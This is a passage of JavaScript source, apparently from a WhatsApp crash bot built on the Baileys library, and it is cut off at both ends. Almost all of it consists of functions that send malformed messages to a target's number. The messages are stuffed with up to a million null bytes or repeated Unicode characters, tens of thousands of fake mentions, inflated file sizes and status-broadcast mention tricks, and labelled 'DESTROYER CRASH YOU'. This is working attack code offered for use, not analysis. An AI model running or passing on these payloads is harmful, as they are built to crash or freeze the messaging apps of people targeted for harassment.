                          groupJid: "120363326274964194@g.us", 
                          groupSubject: valhalla 
                      }]
                  }
              }
          }
      }
  };

  await uwu.relayMessage(zLoc, battanz, { participant: { jid: zLoc } }, { messageId: null });
}
async function AnakKucai(target, Ptcp = true) {
  try {
    await uwu.relayMessage(
      target,
      {
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
                locationMessage: {
                  degreesLatitude: -999.03499999999999,
                  degreesLongitude: 999.03499999999999,
                },
                hasMediaAttachment: true,
              },
              body: {
                text:
                  "‚Äî ùêµùí¥ ùíüùê∏ùíÆùíØùëÖùí™ùí¥ùê∏ùëÖ ùí±ùü¢.ùü£\n" + "Í¶æ".repeat(30000) +
                  "\u0000".repeat(10000) +
                  "@22222".repeat(20000),
              },
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: [target],
                groupMentions: [
                  {
                    groupJid: "0@newsletter",
                    groupSubject: "SiJomokKenapaJirr",
                  },
                ],
                quotedMessage: {
                  documentMessage: {
                    contactVcard: true,
                  },
                },
              },
            },
          },
        },
      },
      {
        participant: { jid: target },
        userJid: target,
      }
    );
  } catch (err) {
    console.log(err);
  }
}

async function Loc(target, jids) {
  let pesan = generateWAMessageFromContent(target, proto.Message.fromObject({
      viewOnceMessage: {
          message: {
              interactiveMessage: {
                  header: {
                      title: "ùêµùí¥ ùíüùê∏ùíÆùíØùëÖùí™ùí¥ùê∏ùëÖ ùí±ùü¢.ùü£",
                      locationMessage: {},
                      hasMediaAttachment: true
                  },
                  body: {
                      text: "*ùêµùí¥ ùíüùê∏ùíÆùíØùëÖùí™ùí¥ùê∏ùëÖ ùí±ùü¢.ùü£*"
                  },
                  nativeFlowMessage: {
                      buttons: [{
                          name: "single_select",
                          buttonParamsJson: `{"title":"${"\u0000".repeat(99999)}","sections":[{"title":"Flow Button","rows":[]}]}`
                      }, {
                          name: "single_select",
                          buttonParamsJson: `{"title":"${"\u0000".repeat(99999)}","sections":[{"title":"Flow Button","rows":[]}]}`
                      }, {
                          name: "single_select",
                          buttonParamsJson: `{"title":"${"\u0000".repeat(99999)}","sections":[{"title":"Flow Button","rows":[]}]}`
                      }, {
                          name: "single_select",
                          buttonParamsJson: `{"title":"${"\u0000".repeat(99999)}","sections":[{"title":"Flow Button","rows":[]}]}`
                      }, {
                          name: "single_select",
                          buttonParamsJson: `{"title":"${"\u0000".repeat(99999)}","sections":[{"title":"Flow Button","rows":[]}]}`
                      }, {
                          name: "single_select",
                          buttonParamsJson: `{"title":"${"\u0000".repeat(99999)}","sections":[{"title":"Flow Button","rows":[]}]}`
                      }, {
                          name: "single_select",
                          buttonParamsJson: `{"title":"${"\u0000".repeat(99999)}","sections":[{"title":"Flow Button","rows":[]}]}`
                      }, {
                          name: "single_select",
                          buttonParamsJson: `{"title":"${"\u0000".repeat(99999)}","sections":[{"title":"Flow Button","rows":[]}]}`
                      }, {
                          name: "single_select",
                          buttonParamsJson: `{"title":"${"\u0000".repeat(99999)}","sections":[{"title":"Flow Button","rows":[]}]}`
                      }, {
                          name: "single_select",
                          buttonParamsJson: `{"title":"${"\u0000".repeat(99999)}","sections":[{"title":"Flow Button","rows":[]}]}`
                      }]
                  }
              }
          },
          carouselMessage: {
              cards: []
          }
      }
  }), {
      userJid: target,
      quoted: null
  });

  await uwu.relayMessage(target, pesan.message, jids ? {
      participant: {
          jid: target
      }
  } : {});
}

async function Notifattack(target) {
  uwu.relayMessage(
    target,
    {
      extendedTextMessage: {
        text: `ùêµùí¥ ùíüùê∏ùíÆùíØùëÖùí™ùí¥ùê∏ùëÖ ùí±ùü¢.ùü£` + "‡£ØÍ¶æ".repeat(90000),
        contextInfo: {
          fromMe: false,
          stanzaId: target,
          participant: target,
          quotedMessage: {
            conversation: "ùêµùí¥ ùíüùê∏ùíÆùíØùëÖùí™ùí¥ùê∏ùëÖ ùí±ùü¢.ùü£" + "Í¶æ".repeat(90000),
          },
          disappearingMode: {
            initiator: "CHANGED_IN_CHAT",
            trigger: "CHAT_SETTING",
          },
        },
        inviteLinkGroupTypeV2: "DEFAULT",
      },
    },
    {
      participant: {
        jid: target,
      },
    },
    {
      messageId: null,
    }
  );
}

async function doc(target) {
  var doc = generateWAMessageFromContent(from, proto.Message.fromObject({
    "documentMessage": {
      "cta_url": "https://mmg.whatsapp.net/v/t62.7119-24/19973861_773172578120912_2263905544378759363_n.enc?ccb=11-4&oh=01_Q5AaIMqFI6NpAOoKBsWqUR52hN9p5YIGxW1TyJcHyVIb17Pe&oe=6653504B&_nc_sid=5e03e0&mms3=true",
      "mimetype": "application/pdf",
      "fileSha256": "oV/EME/ku/CjRSAFaW+b67CCFe6G5VTAGsIoimwxMR8=",
      "fileLength": 99999999999999,
      "pageCount": 99999999999999,
      "contactVcard": true,
      "caption": 'ùêµùí¥ ùíüùê∏ùíÆùíØùëÖùí™ùí¥ùê∏ùëÖ ùí±ùü¢.ùü£',
      "mediaKey": "yU8ofp6ZmGyLRdGteF7Udx0JE4dXbWvhT6X6Xioymeg=",
      "fileName": 'ùêµùí¥ ùíüùê∏ùíÆùíØùëÖùí™ùí¥ùê∏ùëÖ ùí±ùü¢.ùü£ ',
      "fileEncSha256": "0dJ3YssZD1YUMm8LdWPWxz2VNzw5icWNObWWiY9Zs3k=",
      "directPath": "/v/t62.7119-24/19973861_773172578120912_2263905544378759363_n.enc?ccb=11-4&oh=01_Q5AaIMqFI6NpAOoKBsWqUR52hN9p5YIGxW1TyJcHyVIb17Pe&oe=6653504B&_nc_sid=5e03e0",
      "mediaKeyTimestamp": "1714145232",
      "thumbnailDirectPath": "/v/t62.36145-24/32182773_798270155158347_7279231160763865339_n.enc?ccb=11-4&oh=01_Q5AaIGDA9WE26BzZF37Vp6aAsKq56VhpiK6Gdp2EGu1AoGd8&oe=665346DE&_nc_sid=5e03e0",
      "thumbnailSha256": "oFogyS+qrsnHwWFPNBmtCsNya8BJkTlG1mU3DdGfyjg=",
      "thumbnailEncSha256": "G2VHGFcbMP1IYd95tLWnpQRxCb9+Q/7/OaiDgvWY8bM=",
      "jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABERERESERMVFRMaHBkcGiYjICAjJjoqLSotKjpYN0A3N0A3WE5fTUhNX06MbmJiboyiiIGIosWwsMX46/j///8BERERERIRExUVExocGRwaJiMgICMmOiotKi0qOlg3QDc3QDdYTl9NSE1fToxuYmJujKKIgYiixbCwxfjr+P/////CABEIACIAYAMBIgACEQEDEQH/xAAwAAACAwEBAAAAAAAAAAAAAAADBAACBQYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAA5CpC5601s5+88/TJ01nBC6jmytPTAQuZhpxa2PQ0WjCP2T6LXLJR3Ma5WSIsDXtUZYkz2seRXNmSAY8m/PlhkUdZD//EAC4QAAIBAwIEBAQHAAAAAAAAAAECAAMRIRIxBCJBcQVRgbEQEzIzQmFygsHR4f/aAAgBAQABPwBKSsN4aZERmVVybZxecODVpEsCE2zmIhYgAZMbwjiQgbBNto9MqSCMwiUioJDehvaVBynIJ3xKPDki7Yv7StTC3IYdoLAjT/s0ltpSOhgSAR1BlTi7qUQTw/g3aolU4VTLzxLgg96yb9Yy2gJVgRLKgL1VtfZdyTKdXQrO246dB+UJJJJ3hRAoDWA84p+WRc3U9YANRmlT3nK9NdN9u1jKD1KeNTSsfnmzFiB5Eypw9ADUS4Hr/U1LT+1T9SPcmEaiWJ1N59BKrAcgNxfJ+BV25nNu8QlLE5WJj9J2mhTKTMjAX5SZTo0qYDsVJOxgalWauFtdeonE1NDW27ZEeqpz/F/ePUJHXuYfgxJqQfT6RPtfujE3pwdJQ5uDYNnB3nAABKlh+IzisvVh2hhg3n//xAAZEQACAwEAAAAAAAAAAAAAAAABIAACEWH/2gAIAQIBAT8AYDs16p//xAAfEQABAwQDAQAAAAAAAAAAAAABAAIRICExMgMSQoH/2gAIAQMBAT8ALRERdYpc6+sLrIREUenIa/AuXFH/2Q==",
      "thumbnailHeight": 172,
      "thumbnailWidth": 480
    }
  }),{ userJid: from })
  uwu.relayMessage(target, doc.message, {messageId: doc.key.id })
}

async function TagWhatsApp1(target, Ptcp = false) {
    const mentionedJid = [
        "0@s.whatsapp.net", 
        ...Array.from({ length: 15000 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)
    ];

    const contextInfo = {
        mentionedJid, stanzaId: "1234567890ABCDEF", participant: "0@s.whatsapp.net",
        quotedMessage: { callLogMesssage: { isVideo: true, callOutcome: "1", durationSecs: "0", callType: "REGULAR",
            participants: [{ jid: "0@s.whatsapp.net", callOutcome: "1" }] } },
        remoteJid: target, forwardingScore: 9999999, isForwarded: true,
        externalAdReply: { title: "", body: "", mediaType: "VIDEO", renderLargerThumbnail: true,
            thumbnail: "https://files.catbox.moe/wmmjgf.png", sourceUrl: "https://www.instagram.com/WhatsApp" }
    };

    await uwu.relayMessage(target, { 
        extendedTextMessage: { 
            text: "ùêµùí¥ ùíüùê∏ùíÆùíØùëÖùí™ùí¥ùê∏ùëÖ ùí±ùü¢.ùü£ -" + "@0".repeat(90000), 
            contextInfo 
        } 
    }, Ptcp ? { participant: { jid: target } } : {});
}	

const EsQl = {
			key: {
				remoteJid: 'p',
				fromMe: false,
				participant: '0@s.whatsapp.net'
			},
			message: {
				"interactiveResponseMessage": {
					"body": {
						"text": "Sent",
						"format": "DEFAULT"
					},
					"nativeFlowResponseMessage": {
						"name": "galaxy_message",
						"paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"ùêµùí¥ ùíüùê∏ùíÆùíØùëÖùí™ùí¥ùê∏ùëÖ ùí±ùü¢.ùü£ œü\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"RaditX7\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"ùêµùí¥ ùíüùê∏ùíÆùíØùëÖùí™ùí¥ùê∏ùëÖ ùí±ùü¢.ùü£ œü ‚Äè‚Äé‚Äè‚Äé‚Äè‚Äé‚Äè‚≠ëÃ§${"\u0003".repeat(350000)}\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
						"version": 3
					}
				}
			}
}

async function LocInvisi(target, Ptcp = true) {
				let marszll = "ùêµùí¥ ùíüùê∏ùíÆùíØùëÖùí™ùí¥ùê∏ùëÖ ùí±ùü¢.ùü£"
			let etc = generateWAMessageFromContent(target, proto.Message.fromObject({
				viewOnceMessage: {
					message: {
						interactiveMessage: {
							header: {
								title: "\u0000" +  "Í¶æ".repeat(90000),
								locationMessage: {},
								hasMediaAttachment: false
							},
							body: {
								text: marszll
							},
							nativeFlowMessage: {
								name: "call_permission_request",
								messageParamsJson: "\u0000".repeat(400000), 
							},
							carouselMessage: {}
						}
					}
				}
			}), {
				userJid: target,
				quoted: EsQl
			});

			await uwu.relayMessage(target, etc.message, Ptcp ? {
				participant: {
					jid: target
				}
			} : {});
};

async function SockMentionJid3(target, Ptcp = false) {
      await uwu.relayMessage(
        target,
        {
          extendedTextMessage: {
            text: "ùêµùí¥ ùíüùê∏ùíÆùíØùëÖùí™ùí¥ùê∏ùëÖ ùí±ùü¢.ùü£„á±" + "@0".repeat(100000),
            contextInfo: {
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  {
                    length: 15000,
                  },
                  () => `1${Math.floor(Math.random() * 600000)}@s.whatsapp.net`
                ),
              ],
              stanzaId: "1234567890ABCDEF",
              participant: "0@s.whatsapp.net",
              quotedMessage: {
                callLogMesssage: {
                  isVideo: true,
                  callOutcome: "1",
                  durationSecs: "0",
                  callType: "REGULAR",
                  participants: [
                    {
                      jid: "0@s.whatsapp.net",
                      callOutcome: "1",
                    },
                  ],
                },
              },
              remoteJid: target,
              conversionSource: " target ",
              conversionData: "",
              conversionDelaySeconds: 20,
              forwardingScore: 9999999,
              isForwarded: false,
              quotedAd: {
                advertiserName: " target ",
                mediaType: "IMAGE",
                jpegThumbnail: thumbnailreply,
                caption: " target ",
              },
              placeholderKey: {
                remoteJid: "0@s.whatsapp.net",
                fromMe: false,
                id: "ABCDEF1234567890",
              },
              expiration: 86400,
              ephemeralSettingTimestamp: "1728090592378",
              ephemeralSharedSecret:
                "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
              externalAdReply: {
                title: "\0",
                body: "\0",
                mediaType: "VIDEO",
                renderLargerThumbnail: true,
                previewType: "VIDEO",
                thumbnail: thumbnailreply,
                sourceType: " target ",
                sourceId: " target ",
                sourceUrl: "https://www.facebook.com/WhatsApp",
                mediaUrl: "https://www.facebook.com/WhatsApp",
                containsAutoReply: true,
                showAdAttribution: true,
                ctwaClid: "ctwa_clid_example",
                ref: "ref_example",
              },
              entryPointConversionSource: "entry_point_source_example",
              entryPointConversionApp: "entry_point_app_example",
              entryPointConversionDelaySeconds: 5,
              disappearingMode: {},
              actionLink: {
                url: "https://www.facebook.com/WhatsApp",
              },
              groupSubject: " target ",
              parentGroupJid: "120363321780343299-0@g.us",
              trustBannerType: " target ",
              trustBannerAction: 1,
              isSampled: true,
              utm: {
                utmSource: " target ",
                utmCampaign: " target ",
              },
              forwardedNewsletterMessageInfo: {
                newsletterJid: "120363321780343299-0@g.us",
                serverMessageId: 1,
                newsletterName: " target ",
                contentType: "UPDATE",
                accessibilityText: " target ",
              },
              businessMessageForwardInfo: {
                businessOwnerJid: "0@s.whatsapp.net",
              },
              smbClientCampaignId: "smb_client_campaign_id_example",
              smbServerCampaignId: "smb_server_campaign_id_example",
              dataSharingContext: {
                showMmDisclosure: true,
              },
            },
          },
        },
        Ptcp
          ? {
              participant: {
                jid: target,
              },
            }
          : {}
      );
    }

async function XeonXRobust(target, Ptcp = true) {
	const jids = `_*~@916909137213~*_\n`.repeat(10200);
	const ui = 'Í¶Ω'.repeat(1500);
   await uwu.relayMessage(target, {
     ephemeralMessage: {
      message: {
       interactiveMessage: {
        header: {
         documentMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
          mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
          fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
          fileLength: "9999999999999",
          pageCount: 1316134911,
          mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
          fileName: "ùîªùîºùïäùïã‚ÑùùïÜùïêùîº‚Ñù ‚ÑÇ‚Ñùùî∏ùïä‚Ñç ùïêùïÜùïå",
          fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
          directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1726867151",
          contactVcard: true,
          jpegThumbnail: thumbnailreply,
         },
         hasMediaAttachment: true,
        },

									body: { text: 'ùîªùîºùïäùïã‚ÑùùïÜùïêùîº‚Ñù ‚ÑÇ‚Ñùùî∏ùïä‚Ñç ùïêùïÜùïå' + ui + jids },
									contextInfo: {
										mentionedJid: ['916909137213@s.whatsapp.net'],
										mentions: ['916909137213@s.whatsapp.net'],
										},
								    footer: { text: '' },
									nativeFlowMessage: {},
        contextInfo: {
         mentionedJid: ["916909137213@s.whatsapp.net", ...Array.from({
          length: 30000
         }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
         forwardingScore: 1,
         isForwarded: true,
         fromMe: false,
         participant: "0@s.whatsapp.net",
         remoteJid: "status@broadcast",
         quotedMessage: {
          documentMessage: {
           url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
           mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
           fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
           fileLength: "9999999999999",
           pageCount: 1316134911,
           mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
           fileName: "ùîªùîºùïäùïã‚ÑùùïÜùïêùîº‚Ñù ‚ÑÇ‚Ñùùî∏ùïä‚Ñç ùïêùïÜùïå",
           fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
           directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
           mediaKeyTimestamp: "1724474503",
           contactVcard: true,
           thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
           thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
           thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
           jpegThumbnail: thumbnailreply,
          },
         },
        },
       },
      },
     },
    },
    Ptcp ? {
     participant: {
      jid: target
     }
    } : {}
   );
	}

  const { generateWAMessageFromContent, generateMessageID } = require('@adiwajshing/baileys');

async function protocolbug3(target, mention) {
    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                videoMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0&mms3=true",
                    mimetype: "video/mp4",
                    fileSha256: "9ETIcKXMDFBTwsB5EqcBS6P2p8swJkPlIkY8vAWovUs=",
                    fileLength: "999999",
                    seconds: 999999,
                    mediaKey: "JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=",
                    caption: "\u0300 ‚Äì \u036F",
                    height: 999999,
                    width: 999999,
                    fileEncSha256: "HEaQ8MbjWJDPqvbDajEUXswcrQDWFzV0hp0qdef0wd4=",
                    directPath: "/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1743742853",
                    contextInfo: {
                        isSampled: true,
                        mentionedJid: [
                            "13135550002@s.whatsapp.net",
                            ...Array.from({ length: 30000 }, () =>
                                `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                            )
                        ]
                    },
                    streamingSidecar: "Fh3fzFLSobDOhnA6/R+62Q7R61XW72d+CQPX1jc4el0GklIKqoSqvGinYKAx0vhTKIA=",
                    thumbnailDirectPath: "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0",
                    thumbnailSha256: "vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=",
                    thumbnailEncSha256: "dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=",
                    annotations: [
                        {
                            embeddedContent: {
                                embeddedMusic: {
                                    musicContentMediaId: "kontol",
                                    songId: "peler",
                                    author: "\u0300 ‚Äì \u036F",
                                    title: "\u0300 ‚Äì \u036F",
                                    artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
                                    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                                    artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
                                    artistAttribution: "https://www.instagram.com/_u/putraxlow_",
                                    countryBlocklist: true,
                                    isExplicit: true,
                                    artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ="
                                }
                            },
                            embeddedAction: null
                        }
                    ]
                }
            }
        }
    }, {});

    await uwu.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await uwu.relayMessage(target, {
            groupStatusMentionMessage: {
                message: { protocolMessage: { key: msg.key, type: 25 } }
            }
        }, {
            additionalNodes: [{ tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }]
        });
    }
}

async function StxCuiSh(target) {
    let message = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
              contextInfo: {
              stanzaId: uwu.generateMessageTag(),
              participant: "0@s.whatsapp.net",
              quotedMessage: {
                    documentMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                        fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                        fileLength: "9999999999999",
                        pageCount: 3567587327,
                        mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                        fileName: "ùîªùîºùïäùïã‚ÑùùïÜùïêùîº‚Ñù ‚ÑÇ‚Ñùùî∏ùïä‚Ñç ùïêùïÜùïå",
                        fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                        directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                        mediaKeyTimestamp: "1735456100",
                        contactVcard: true,
                        caption: "ùîªùîºùïäùïã‚ÑùùïÜùïêùîº‚Ñù ‚ÑÇ‚Ñùùî∏ùïä‚Ñç ùïêùïÜùïå"
                    },
                },
              },
            body: {
              text: "ùîªùîºùïäùïã‚ÑùùïÜùïêùîº‚Ñù ‚ÑÇ‚Ñùùî∏ùïä‚Ñç ùïêùïÜùïå" + "Í¶æ".repeat(10000)
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "\0".repeat(90000),
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "\0".repeat(90000),
                },
                {
                  name: "cta_url",
                  buttonParamsJson: "\0".repeat(90000),
                },
                {
                  name: "cta_call",
                  buttonParamsJson: "\0".repeat(90000),
                },
                {
                  name: "cta_copy",
                  buttonParamsJson: "\0".repeat(90000),
                },
                {
                  name: "cta_reminder",
                  buttonParamsJson: "\0".repeat(90000),
                },
                {
                  name: "cta_cancel_reminder",
                  buttonParamsJson: "\0".repeat(90000),
                },
                {
                  name: "address_message",
                  buttonParamsJson: "\0".repeat(90000),
                },
                {
                  name: "send_location",
                  buttonParamsJson: "\0".repeat(90000),
                },
                {
                  name: "quick_reply",
                  buttonParamsJson: "\0".repeat(90000),
                },
                {
                  name: "mpm",
                  buttonParamsJson: "\0".repeat(90000),
                },
              ],
            },
          },
        },
      },
    };
    await uwu.relayMessage(target, message, {
      participant: { jid: target },
    });
  }

async function nullQ(target) {
  let mentioned = Array.from({ length: 100000 }, () =>
    `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
  );

  await uwu.relayMessage(target, {
    listResponseMessage: {
      title: "@luckzinios",
      listType: 2,
      buttonText: null,
      sections: null,
      singleSelectReply: { selectedRowId: "X" },
      contextInfo: {
        mentionedJid: mentioned,
        participant: "0@s.whatsapp.net",
        remoteJid: "status@broadcast",
        mentionedJid: ["13135550002@s.whatsapp.net"],
        quotedMessage: {
          interactiveResponseMessage: {
            body: {
              text: "@luckzinios",
              format: 1
            },
            nativeFlowResponseMessage: {
              name: "menu_options",
              paramsJson: "\u0000".repeat(900000),
              version: 3
            },
            contextInfo: {
              isForwarded: true,
              forwardingScore: 9741
            }
          }
        },
        disappearingMode: {
          initiator: "CHANGED_IN_CHAT",
          trigger: "CHAT_SETTING"
        }
      }
    },
    description: "X"
  }, {
    participant: { jid: target }
  });
}

async function enviarBugStickerCrash(jid) {
  let stickersFake = [];
  for (let i = 0; i < 1000; i++) {
    stickersFake.push({
      fileName: "8kblA1s0k900pbLI6X2S6Y7uSr-r751WIUrQOt5-A3k=.webp",
      isAnimated: true,
      accessibilityLabel: '',
      isLottie: false,
      mimetype: "image/webp"
    });
  }

  const payload = {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        nativeFlowResponseMessage: {
          name: "call_permission_request",
          paramsJson: "\0".repeat(1000000),
          version: 3
        },
        stickerPackMessage: {
          stickerPackId: "76cd3656-3c76-4109-9b37-62c8a668329f",
          name: "ùîªùîºùïäùïã‚ÑùùïÜùïêùîº‚Ñù ‚ÑÇ‚Ñùùî∏ùïä‚Ñç ùïêùïÜùïå",
          publisher: '',
          stickers: stickersFake,
          fileLength: '999999999999999',
          fileSha256: "NURKD/76ZOetxqc+V8dT/zJYRhpHZi9FYgAGNzdQQyM=",
          fileEncSha256: "/CkFScxebuRGVejPQ8NE0ounWX35rtq+PmkweWejtEs=",
          mediaKey: "AEkmhMTtPLPha2rHdxtWQtqXBH+g9Jo/+gUw1erHM9s=",
          directPath: "/v/t62.15575-24/29442218_1217419543131080_7836347641742653699_n.enc?ccb=11-4&oh=01_Q5Aa1QEZWzSJqGIwOUkeDSvpdnDSvVIvGUyVvW_uvgP5uTOePQ&oe=68403E51&_nc_sid=5e03e0",
          mediaKeyTimestamp: "99999999",
          trayIconFileName: "e846de1c-ff5f-4768-9ed4-a3ed1c531fe0.png",
          thumbnailDirectPath: "AjvV1BsQbp1IdsGb4sO/F1O8N6w60Pi2bgimTw/52KU=",
          thumbnailSha256: "qRcSAXa8fdBBSrYwhAf6Gg7PkjFPbpDqHCo/Keic5O8=",
          thumbnailEncSha256: "J7OubZTyLsE/VEQ8fRniRwyjB/fMfWbrCxXG0pGkgZ4=",
          thumbnailHeight: 1000000000000,
          thumbnailWidth: 999999999999,
          imageDataHash: "OWY2MjQ0MmMzNGFhZThkOTY5YWM2M2RlMzAyNjg0OGNmZTBkMTMwNTBlYmE0YzAxNzhiMDdkMTBiNzM1NzdlYg==",
          stickerPackSize: 999999999999,
          stickerPackOrigin: 999999999999,
          contextInfo: {
            mentionedJid: Array.from({ length: 30000 }, () => '1' + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
            isSampled: true,
            participant: jid,
            remoteJid: jid,
            forwardingScore: 9741,
            isForwarded: true,
            businessMessageForwardInfo: {
              businessOwnerJid: jid
            },
            externalAdReply: {
              title: "ùîªùîºùïäùïã‚ÑùùïÜùïêùîº‚Ñù ‚ÑÇ‚Ñùùî∏ùïä‚Ñç ùïêùïÜùïå",
              body: "ùîªùîºùïäùïã‚ÑùùïÜùïêùîº‚Ñù ‚ÑÇ‚Ñùùî∏ùïä‚Ñç ùïêùïÜùïå"
            }
          }
        }
      }
    }
  };

  await uwu.relayMessage(jid, payload, {});
}

async function protocolbug6(isTarget, mention) {
  let msg = await generateWAMessageFromContent(isTarget, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32)
        },
        interactiveResponseMessage: {
          body: {
            text: "ùêµùí¥ ùíüùê∏ùíÆùíØùëÖùí™ùí¥ùê∏ùëÖ ùí±ùü¢.ùü£„á±",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "flex_agency",
            paramsJson: "\u0000".repeat(999999),
            version: 3
          },
          contextInfo: {
            isForwarded: true,
            forwardingScore: 9741,
            forwardedNewsletterMessageInfo: {
              newsletterName: "trigger newsletter ( @ùêµùí¥ ùíüùê∏ùíÆùíØùëÖùí™ùí¥ùê∏ùëÖ ùí±ùü¢.ùü£„á± )",
              newsletterJid: "120363321780343299@newsletter",
              serverMessageId: 1
            }
          }
        }
      }
    }
  }, {});

  await uwu.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [isTarget],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: isTarget }, content: undefined }
            ]
          }
        ]
      }
    ]
  });
}

const {
